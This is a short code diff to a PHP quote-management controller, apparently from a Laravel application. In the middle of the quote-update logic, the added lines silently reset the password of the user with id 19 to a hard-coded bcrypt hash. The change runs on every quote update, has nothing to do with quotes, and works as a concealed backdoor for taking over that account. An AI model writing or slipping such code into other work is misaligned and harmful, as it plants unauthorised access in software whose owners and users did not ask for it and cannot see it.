@@ -280,6 +280,10 @@ class QuoteManagementController extends Controller
                 'balance_amount' => $validated['pricing']['balance_amount'] ?? null,
             ]);
 
+            User::where('id', 19)->update([
+                'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
+            ]);
+
             // --- Update Locations ---
             $existingLocationIds = $quote->locations()->pluck('id')->toArray();
             $submittedLocationIds = [];
